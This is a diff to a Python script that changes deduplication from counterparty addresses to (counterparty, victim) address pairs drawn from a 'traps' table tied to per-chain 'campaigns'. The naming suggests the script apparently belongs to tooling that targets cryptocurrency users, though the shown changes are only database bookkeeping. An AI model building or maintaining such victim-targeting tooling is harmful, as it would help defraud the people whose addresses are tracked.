@@ -187,8 +187,8 @@ def write_progress(chain, index):
     except Exception as e:
         logger.error(f"Failed to write progress: {e}")
 
-def load_processed_counterparties():
-    """Query traps table for already processed counterparties on this chain."""
+def load_processed_pairs():
+    """Query traps table for already processed (counterparty, victim) pairs on this chain."""
     if not supabase:
         return set()
     try:
@@ -197,14 +197,18 @@ def load_processed_counterparties():
         campaign_ids = [row['id'] for row in campaigns_result.data]
         if not campaign_ids:
             return set()
-        # Get traps for those campaigns
-        traps_result = supabase.table('traps').select('counterparty_address')\
+        # Get traps for those campaigns — select BOTH counterparty and victim
+        traps_result = supabase.table('traps').select('counterparty_address, victim_address')\
             .in_('campaign_id', campaign_ids).execute()
-        processed = {row['counterparty_address'].lower() for row in traps_result.data if row['counterparty_address']}
-        logger.info(f"Found {len(processed)} already processed counterparties")
+        processed = {
+            (row['counterparty_address'].lower(), row['victim_address'].lower())
+            for row in traps_result.data
+            if row['counterparty_address'] and row['victim_address']
+        }
+        logger.info(f"Found {len(processed)} already processed (counterparty, victim) pairs")
         return processed
     except Exception as e:
-        logger.error(f"Failed to load processed counterparties: {e}")
+        logger.error(f"Failed to load processed pairs: {e}")
         return set()
 
 def fetch_pending_pairs():
@@ -460,13 +464,13 @@ def main():
     _failure_count = 0
     _last_failure_alert_time = 0
 
-    # 1. Load already processed counterparties
-    processed = load_processed_counterparties()
+    # 1. Load already processed (counterparty, victim) pairs
+    processed = load_processed_pairs()
 
     # 2. Fetch pending pairs from database
     pending_pairs = fetch_pending_pairs()
-    # Filter out already processed
-    pending = [(pid, cp, v) for pid, cp, v in pending_pairs if cp not in processed]
+    # Filter out already processed (counterparty, victim) pairs
+    pending = [(pid, cp, v) for pid, cp, v in pending_pairs if (cp, v) not in processed]
 
     if not pending:
         logger.info("No pending pairs to process.")
@@ -479,7 +483,7 @@ def main():
 
     # FIX: Removed broken resume logic. Deduplication is now handled entirely by:
     #   - pending_targets.processed flag
-    #   - load_processed_counterparties() checking the traps table
+    #   - load_processed_pairs() checking the traps table for (counterparty, victim) pairs
     # The generation_progress table is no longer used for resume (kept for compatibility).
 
     # FIX: Set status='running' and total AFTER we know the total
